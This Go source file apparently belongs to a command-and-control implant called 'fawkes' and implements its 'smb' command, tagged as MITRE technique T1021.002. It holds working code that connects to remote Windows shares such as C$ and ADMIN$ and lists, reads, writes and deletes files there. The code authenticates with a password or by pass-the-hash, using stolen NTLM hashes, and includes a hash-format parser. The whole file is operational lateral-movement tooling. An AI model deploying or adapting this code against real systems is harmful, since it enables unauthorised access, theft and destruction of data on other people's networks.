package commands

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/hirochachacha/go-smb2"
)

type SmbCommand struct{}

func (c *SmbCommand) Name() string { return "smb" }
func (c *SmbCommand) Description() string {
	return "SMB file operations on remote shares — list, read, write, delete files via SMB2 (T1021.002)"
}

type smbArgs struct {
	Action   string `json:"action"`   // ls, cat, upload, rm, shares
	Host     string `json:"host"`     // target host
	Share    string `json:"share"`    // share name (e.g., C$, ADMIN$, ShareName)
	Path     string `json:"path"`     // file/directory path within share
	Username string `json:"username"` // DOMAIN\user or user
	Password string `json:"password"` // password
	Hash     string `json:"hash"`     // NTLM hash (pass-the-hash, hex-encoded NT hash)
	Domain   string `json:"domain"`   // domain (optional, can be part of username)
	Content  string `json:"content"`  // file content for upload action
	Port     int    `json:"port"`     // SMB port (default: 445)
}

func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use -action <ls|cat|upload|rm|shares> -host <target> -username <user> -password <pass>")
	}

	var args smbArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Host == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
		return errorResult("Error: host, username, and password (or hash) are required")
	}

	if args.Action == "" {
		return errorResult("Error: action required. Valid actions: ls, cat, upload, rm, shares")
	}

	if args.Port <= 0 {
		args.Port = 445
	}

	// Parse domain from username if DOMAIN\user format
	if args.Domain == "" {
		if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
			args.Domain = parts[0]
			args.Username = parts[1]
		} else if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
			args.Domain = parts[1]
			args.Username = parts[0]
		}
	}

	switch args.Action {
	case "shares":
		return smbListShares(args)
	case "ls":
		if args.Share == "" {
			return errorResult("Error: -share required for ls action")
		}
		return smbListDir(args)
	case "cat":
		if args.Share == "" || args.Path == "" {
			return errorResult("Error: -share and -path required for cat action")
		}
		return smbReadFile(args)
	case "upload":
		if args.Share == "" || args.Path == "" || args.Content == "" {
			return errorResult("Error: -share, -path, and -content required for upload action")
		}
		return smbWriteFile(args)
	case "rm":
		if args.Share == "" || args.Path == "" {
			return errorResult("Error: -share and -path required for rm action")
		}
		return smbDeleteFile(args)
	default:
		return errorf("Error: unknown action %q. Valid: ls, cat, upload, rm, shares", args.Action)
	}
}

// smbConn wraps an SMB session with its underlying connection for deadline management.
type smbConn struct {
	session *smb2.Session
	conn    net.Conn
}

// setDeadline sets a timeout deadline on the underlying TCP connection.
// Call this before each SMB operation to prevent indefinite hangs.
func (sc *smbConn) setDeadline(timeout time.Duration) {
	_ = sc.conn.SetDeadline(time.Now().Add(timeout))
}

// clearDeadline removes the deadline after an operation completes.
func (sc *smbConn) clearDeadline() {
	_ = sc.conn.SetDeadline(time.Time{})
}

// close logs off the session and closes the TCP connection.
func (sc *smbConn) close() {
	_ = sc.session.Logoff()
	_ = sc.conn.Close()
}

// smbOperationTimeout is the default timeout for individual SMB operations.
const smbOperationTimeout = 30 * time.Second

func smbConnect(args smbArgs) (*smbConn, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", args.Host, args.Port), 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("TCP connect to %s:%d: %v", args.Host, args.Port, err)
	}

	initiator := &smb2.NTLMInitiator{
		User:   args.Username,
		Domain: args.Domain,
	}

	// Pass-the-hash: use NTLM hash directly instead of password
	if args.Hash != "" {
		hashBytes, err := smbDecodeHash(args.Hash)
		if err != nil {
			_ = conn.Close()
			return nil, fmt.Errorf("invalid NTLM hash: %v", err)
		}
		initiator.Hash = hashBytes
	} else {
		initiator.Password = args.Password
	}

	d := &smb2.Dialer{Initiator: initiator}

	// Set a deadline for the SMB session setup (auth exchange)
	_ = conn.SetDeadline(time.Now().Add(smbOperationTimeout))
	session, err := d.Dial(conn)
	if err != nil {
		_ = conn.Close()
		return nil, fmt.Errorf("SMB auth to %s as %s\\%s: %v", args.Host, args.Domain, args.Username, err)
	}
	_ = conn.SetDeadline(time.Time{}) // Clear deadline after auth

	return &smbConn{session: session, conn: conn}, nil
}

// smbDecodeHash decodes an NTLM hash from various formats:
// - Pure hex: "8846f7eaee8fb117ad06bdd830b7586c" (16 bytes = NT hash)
// - LM:NT format: "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
func smbDecodeHash(hashStr string) ([]byte, error) {
	hashStr = strings.TrimSpace(hashStr)
	// Strip LM hash prefix if present (LM:NT format)
	if parts := strings.SplitN(hashStr, ":", 2); len(parts) == 2 && len(parts[0]) == 32 && len(parts[1]) == 32 {
		hashStr = parts[1] // Use NT hash part
	}
	hashBytes, err := hex.DecodeString(hashStr)
	if err != nil {
		return nil, fmt.Errorf("hash must be hex-encoded: %v", err)
	}
	if len(hashBytes) != 16 {
		return nil, fmt.Errorf("NT hash must be 16 bytes (32 hex chars), got %d bytes", len(hashBytes))
	}
	return hashBytes, nil
}

func smbListShares(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	shares, err := sc.session.ListSharenames()
	sc.clearDeadline()
	if err != nil {
		return errorf("Error listing shares: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shares on \\\\%s (%d found)\n", args.Host, len(shares)))
	sb.WriteString(strings.Repeat("-", 40) + "\n")
	for _, share := range shares {
		sb.WriteString(fmt.Sprintf("  \\\\%s\\%s\n", args.Host, share))
	}

	return successResult(sb.String())
}

func smbListDir(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	dirPath := args.Path
	if dirPath == "" {
		dirPath = "."
	}

	sc.setDeadline(smbOperationTimeout)
	entries, err := share.ReadDir(dirPath)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error listing \\\\%s\\%s\\%s: %v", args.Host, args.Share, dirPath, err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] \\\\%s\\%s\\%s (%d entries)\n", args.Host, args.Share, dirPath, len(entries)))
	sb.WriteString(fmt.Sprintf("%-12s  %-20s  %s\n", "Size", "Modified", "Name"))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	for _, entry := range entries {
		name := entry.Name()
		if entry.IsDir() {
			name += "/"
		}
		size := formatFileSize(entry.Size())
		modified := entry.ModTime().Format("2006-01-02 15:04:05")
		sb.WriteString(fmt.Sprintf("%-12s  %-20s  %s\n", size, modified, name))
	}

	return successResult(sb.String())
}

func smbReadFile(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	sc.setDeadline(smbOperationTimeout)
	f, err := share.Open(args.Path)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error opening \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
	}
	defer func() { _ = f.Close() }()

	// Get file info for size check
	sc.setDeadline(smbOperationTimeout)
	info, err := f.Stat()
	sc.clearDeadline()
	if err != nil {
		return errorf("Error getting file info: %v", err)
	}

	// Limit to 10MB to avoid memory issues
	const maxSize = 10 * 1024 * 1024
	if info.Size() > maxSize {
		return errorf("Error: file too large (%s). Max 10MB for cat. Use download for large files.", formatFileSize(info.Size()))
	}

	sc.setDeadline(smbOperationTimeout)
	data, err := io.ReadAll(f)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error reading file: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] \\\\%s\\%s\\%s (%s)\n", args.Host, args.Share, args.Path, formatFileSize(info.Size())))
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	sb.WriteString(string(data))

	return successResult(sb.String())
}

func smbWriteFile(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	sc.setDeadline(smbOperationTimeout)
	f, err := share.OpenFile(args.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
	}
	defer func() { _ = f.Close() }()

	sc.setDeadline(smbOperationTimeout)
	n, err := f.Write([]byte(args.Content))
	sc.clearDeadline()
	if err != nil {
		return errorf("Error writing file: %v", err)
	}

	return successf("[+] Written %d bytes to \\\\%s\\%s\\%s", n, args.Host, args.Share, args.Path)
}

func smbDeleteFile(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	sc.setDeadline(smbOperationTimeout)
	err = share.Remove(args.Path)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error deleting \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
	}

	return successf("[+] Deleted \\\\%s\\%s\\%s", args.Host, args.Share, args.Path)
}

// formatFileSize is defined in find.go
